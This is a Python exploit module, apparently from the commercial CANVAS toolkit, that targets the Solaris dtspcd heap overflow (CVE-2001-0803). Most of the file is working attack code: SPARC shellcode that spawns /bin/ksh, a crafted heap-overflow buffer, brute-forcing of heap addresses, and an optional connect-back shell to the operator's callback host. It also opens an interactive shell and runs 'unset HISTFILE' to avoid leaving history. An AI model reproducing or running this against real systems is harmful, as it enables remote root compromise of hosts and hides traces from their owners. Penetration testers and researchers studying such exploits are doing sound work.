#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""

dtspcd heap overflow for Solaris 

"""

#Does use setProgress()
#Does use setState("done")
#Does use setInfo()

VERSION="1.0"

CHANGES="""


"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: sinan.eren@immunityinc.com
#

import sys
if "." not in sys.path: sys.path.append(".")

import socket
from exploitutils import *
import time
from tcpexploit import tcpexploit
from sunrpc import *
import random

import string
import struct
import select
import libs.addressdb as addressdb

from libs.ctelnetlib import Telnet


NAME="dtspcd"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="Nov 06, 2001"
DOCUMENTATION["CERT Advisory"]="http://www.cert.org/advisories/CA-2001-31.html"
DOCUMENTATION["CVE Name"] = "CVE-2001-0803"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0803"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://xforce.iss.net/alerts/advise101.php http://www.kb.cert.org/vuls/id/172583"

DESCRIPTION="dtspcd heap overflow"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris", "sparc", "_i86pc"], ["_AIX"] ]


PORT = "6112"
CHANNEL_ID = 2
SPC_ABORT = 3
SPC_REGISTER = 4

from libs.dtspcd_client import *

class DTSPCDExploit(DTSPCDClient):

    def __init__(self, target, user="", port=6112):
        #tcpexploit.__init__(self)
        self.user = user
        self.set_target(target)
        self.set_port(port)
        DTSPCDClient.__init__(self, target)
        
        #shellcode: write(0, "/bin/ksh", 8) + fcntl(0, F_DUP2FD, 0-1-2) + exec("/bin/ksh"...)
        self.myshellcode =\
        "\xa4\x1c\x40\x11"+\
        "\xa4\x1c\x40\x11"+\
        "\xa4\x1c\x40\x11"+\
        "\xa4\x1c\x40\x11"+\
        "\xa4\x1c\x40\x11"+\
        "\xa4\x1c\x40\x11"+\
        "\x20\xbf\xff\xff"+\
        "\x20\xbf\xff\xff"+\
        "\x7f\xff\xff\xff"+\
        "\xa2\x1c\x40\x11"+\
        "\x90\x24\x40\x11"+\
        "\x92\x10\x20\x09"+\
        "\x94\x0c\x40\x11"+\
        "\x82\x10\x20\x3e"+\
        "\x91\xd0\x20\x08"+\
        "\xa2\x04\x60\x01"+\
        "\x80\xa4\x60\x02"+\
        "\x04\xbf\xff\xfa"+\
        "\x90\x23\xc0\x0f"+\
        "\x92\x03\xe0\x58"+\
        "\x94\x10\x20\x08"+\
        "\x82\x10\x20\x04"+\
        "\x91\xd0\x20\x08"+\
        "\x90\x03\xe0\x58"+\
        "\x92\x02\x20\x10"+\
        "\xc0\x22\x20\x08"+\
        "\xd0\x22\x20\x10"+\
        "\xc0\x22\x20\x14"+\
        "\x82\x10\x20\x0b"+\
        "\x91\xd0\x20\x08"+\
        "\x2f\x62\x69\x6e"+\
        "\x2f\x6b\x73\x68"
        self.name=NAME
        return
        
    def set_user(self, user):
        self.user = user

    def get_user(self):
        return self.user

    def set_target(self, target):
        try:
            self.host = socket.gethostbyname(target)
        except socket.gaierror, err:
            raise DTSPCDException, "DTSPCDExploit, Host: " + target + " " + err[1]

    def get_target(self):
        return self.host

    def set_port(self, port):
        self.port = port

    def get_port(self):
        return self.port
    
        
    def exploit(self, retloc, retaddr):

        self.setup()

        #self.log("internal shellcode len: %d" % len(self.myshellcode))
        self.ovf = "\xa4\x1c\x40\x11\x20\xbf\xff\xff" * ((4096 - 8 - len(self.myshellcode)) / 8)#((0x103e - 8)/4)
        self.ovf += self.myshellcode + "\x00\x00\x10\x3e" + "\x00\x00\x00\x14" +\
                    "\x12\x12\x12\x12" + "\xff\xff\xff\xff" + "\x00\x00\x0f\xf4" +\
                    self.get_chunk(retloc, retaddr)
        self.ovf += "A" * ((0x103e - 8) - len(self.ovf))

        #raw_input("attach")
        
        self.spc_write(self.spc_register("", self.ovf), SPC_REGISTER)

        time.sleep(0.1)
        if self.check_bd():
            return 1
        #self.spc_write("", SPC_ABORT)
        
        self.sck.close()

    def exploit_method1(self, retloc, retaddr):

        self.setup()
        
        self.log("CANVAS Solaris shellcode len: %d" % len(self.shellcode))

        self.ovf = "\xa4\x1c\x40\x11\x20\xbf\xff\xff" * ((4096 - 8 - len(self.shellcode) - 32) / 8)#((0x103e - 8)/4)
        self.ovf += "\xa4\x1c\x40\x11"*8 + self.shellcode + "\x00\x00\x10\x3e" + "\x00\x00\x00\x14" +\
                    "\x12\x12\x12\x12" + "\xff\xff\xff\xff" + "\x00\x00\x0f\xf4" +\
                    self.get_chunk(retloc, retaddr)
        self.ovf += "A" * ((0x103e - 8) - len(self.ovf))

        #raw_input("attach")
        
        self.spc_write(self.spc_register("", self.ovf), SPC_REGISTER)

        time.sleep(0.1)
        
        self.spc_write("", SPC_ABORT)
        
        self.sck.close()
        
    def test_exploit(self, retloc, retaddr):

        self.setup()
        
        self.ovf = "\xa4\x1c\x40\x11\x20\xbf\xff\xff" * ((4096 - 8 - len(self.myshellcode)) / 8)#((0x103e - 8)/4)
        self.ovf += self.myshellcode + "\x00\x00\x10\x3e" + "\x00\x00\x00\x14" +\
                    "\x12\x12\x12\x12" + "\xff\xff\xff\xff" + "\x00\x00\x0f\xf4" +\
                    self.get_chunk(retloc, retaddr)
        self.ovf += "A" * ((0x103e - 8) - len(self.ovf))

        #raw_input("attach")

        try:
            self.spc_write(self.spc_register("", self.ovf), SPC_REGISTER)
        except DTSPCDException:
            #died before recving the whole payload. vuln!
            return 1
        
        #time.sleep(0.1)

        try:
            self.spc_write(self.spc_register("", "are you alive?"), SPC_REGISTER)
            rd, wr, ex = select.select([self.sck], [], [], 3)
            if not rd:
                #cool, we killed it. vuln!
                return 1
            self.spc_read()
        except DTSPCDException:
            #died, never recvied. vuln!
            return 1
        
        #not vulnerable
        self.spc_write("", SPC_ABORT)
        self.sck.close()
        return 0

    def get_chunk(self, retloc, retaddr):
        
        return "\x12\x12\x12\x12" + struct.pack(">L", retaddr) +\
               "\x23\x23\x23\x23" + "\xff\xff\xff\xff" +\
               "\x34\x34\x34\x34" + "\x45\x45\x45\x45" +\
               "\x56\x56\x56\x56" + struct.pack(">L", (retloc - 8))

    def test_attack(self):

        self.get_uname()
        return self.test_exploit(0x12345678, 0x12345678)

    def canwe(self):
        if self.uname_d["os"] != "SunOS":
            raise DTSPCDException, "Currently only supporting SunOS/Solaris"

        if self.uname_d["arch"] != "sun4u":
            raise DTSPCDException, "Curently only supporting Ultra-SPARC architecture"

        ver = self.uname_d["version"]
        if ver == "5.8" or ver == "5.7" or ver == "5.6":
            return
        else:
            raise DTSPCDException, "Currently Solaris 2.6, 7 and 8 are supported."
        
    def attack_method1(self):
        
        self.log("[*]  retrieving remote version [*]")
        self.get_uname()
        self.log("[*]      exploiting ...       [*]")

        self.canwe()

        #solaris 8
        #self.exitfns = [ 0xff23ca14, 0xff23e0b0, 0xff23e0a0, 0xff23dfd4, 0xff23bfb0, 0xdf63dfc8, 0xff1be0b0 ] 
        #from various patch clusters
        
        self.increment = 0x400
        
        self.addrdb = addressdb.SolarisExitfns()
        self.rel = self.uname_d["version"]
        self.exitfns_hook = self.addrdb.get_exitfns_hook(self.rel, "dtspcd")

        if not len(self.exitfns_hook):
            raise DTSPCDException, "there are no entries in address database for the attacked version of the OS."
        
        for each in self.exitfns_hook:
            
            self.retaddr_base = 0x2c000 #heap brute force start addie, good for 2.6, 7 and 8
                                        #almost always work!
            
            while self.retaddr_base < 0x2f000: #heap brute force end

                self.log("trying; retloc: 0x%08x, retaddr: 0x%08x" %\
                        (long(each), long(self.retaddr_base)))

                if self.ISucceeded(): #we sometime get crazy amount of callbacks, make sure we stick to one!
                    return 1
         
                self.exploit_method1(each, self.retaddr_base)

                time.sleep(3)   
                if self.ISucceeded():
                    return 1
                
                self.exploit_method1(each, self.retaddr_base+4)

                time.sleep(3)
                if self.ISucceeded():
                    return 1

                self.retaddr_base += self.increment
                
        self.log("Exploit failed.")
        return 0
        
    def attack(self):
        #aka method0
        self.log("[*]  retrieving remote version [*]")
        self.get_uname()
        self.log("[*]      exploiting ...       [*]")


        self.canwe()
        
        self.addrdb = addressdb.SolarisLdSo()
        self.rel = self.uname_d["version"]
        
        self.ldso_base = self.addrdb.get_ldso_base(self.rel) #solaris 7, 8 also 9
        
        #self.thr_jmp_table = [ 0x321b4, 0x361d8, 0x361e0, 0x37298, 0x381e8 ] #from various patch clusters

        self.thr_jmp_table = self.addrdb.get_ldso_hook(self.rel)

        if not len(self.thr_jmp_table):
            raise DTSPCDException, "Can not attack with the ldso method, please use the exitfns method."
        
        self.increment = 0x400
        
        for each in self.thr_jmp_table:
            
            self.retaddr_base = 0x2c000 #vanilla solaris 8 heap brute start
                                        #almost always work!
            
            while self.retaddr_base < 0x2f000: #heap brute force end

                self.log("trying; retloc: 0x%08x, retaddr: 0x%08x" %\
                        (long(self.ldso_base+each), long(self.retaddr_base)))
                if self.exploit((each+self.ldso_base), self.retaddr_base):
                    return self.sck

                if self.exploit((each+self.ldso_base), self.retaddr_base+4):
                    return self.sck

                self.retaddr_base += self.increment

        self.log("ld.so method did not work. Please try the exitfns method.")
        return 0
    
    def check_bd(self):
        try:
            self.recvbuf = self.sck.recv(100)
            if self.recvbuf.find("ksh") != -1:
                self.log("got shellcode response: %s            " % self.recvbuf)
                #self.proxy()
                return 1
        except socket.error:
            pass

        return 0
    
    def proxy(self):
        
        self.t = Telnet()
        self.t.sock = self.sck
        self.t.write("unset HISTFILE;uname -a;\n")
        self.t.interact()
        sys.exit(1)

class theexploit(tcpexploit, DTSPCDExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=6112
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00\\/.:?\r\n%?"
        self.method=0
        self.cmdline=0
        self.shellcode=""
        return

    def createShellcode(self):

        if self.callback==None:
            self.log("Not making shellcode yet...")
            return
        localhost=self.callback.ip
        localport=self.callback.port

        if "method" in self.argsDict:
            pass
        else:
            self.argsDict["method"] = 1

        if int(self.argsDict["method"]) == 1:
            print "Calling back to %s:%s"%(localhost,localport)
            return self.createSparcShellcode(self.badstring, localhost, localport)
        else:
            #use GOCODE
            print "Recycling socket into UnixShellNode"
            #print "Need to add GOCODE! method not supported yet..."

            
       
    def neededListenerTypes(self):
        # keep a normal listener for now untill i replace the /bin/ksh code
        from canvasengine import SOLARISSPARCLISTENER # TODO: SOLARISSPARCMOSDEF
        return [SOLARISSPARCLISTENER]
        
    def test(self):
        self.host=self.target.interface

        DTSPCDExploit.__init__(self, self.host, "")

        try:
            if self.test_attack():
                self.log("dtspcd is running and vulnerable on remote end.")
                return 1
        except:
            return 0
        
        self.log("dtspcd is not running or not vulnerable.")
        return 0
        
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict["port"])

        # commandline
        if "method" in self.argsDict:
            pass
        else:
            self.argsDict["method"] = 0

        self.method=int(self.argsDict.get("method",self.method))
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))

        try:
            return self.dorun()
        except DTSPCDException, self.expstr:
            self.log(str(self.expstr))
            self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
            return 0
        
    def dorun(self):

        DTSPCDExploit.__init__(self, self.host, "", self.port)

        if self.test_attack():
            self.log("dtspcd is running and vulnerable on remote end.")
            self.setProgress(20)
        else:
            self.log("dtspcd does _not_ seem to be running or vulnerable. Still trying.")
            self.setProgress(20)
            
        #FIXME. give options to command line to use method 1

        if self.method == 1:
            self.log("attacking using exitfns method: connectback shellcode")
            if self.shellcode=="":
                self.log("Need to specify a localhost and localport...failing")
                return 0
            self.attack_method1()
            return
        
        self.zesock = self.attack()
        if not self.zesock:
            return 0
        
        self.zesock.send("\n")

        if self.cmdline:
            self.proxy()
            return
        
        self.tn = Telnet()
        self.tn.sock = self.zesock
        
        from shelllistener import shelllistener, shellfromtelnet
        try:
            shell = shelllistener(shellfromtelnet(self.tn), logfunction = self.logfunction)
        except :
            self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            self.setProgress(-1)

        import unixShellNode
        node = unixShellNode.unixShellNode()
        node.parentnode=self.argsDict["passednodes"][0]
        node.shell = shell
        self.setInfo("%s attacking %s:%d (success!)"%(NAME,self.host,self.port))
        return node
         
    #returns the sploitstring
    def makesploit(self):
        pass

    def displayVersions(self):
        print "1 : Solaris { 6 , 7 , 8 } Ultra "
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    app.options = ["-O method:0 (default, recycle socket)", "-O method:1 (connectback, set -l and -d)"]
    app.cmdline = 1
    ret=standard_callback_commandline(app)
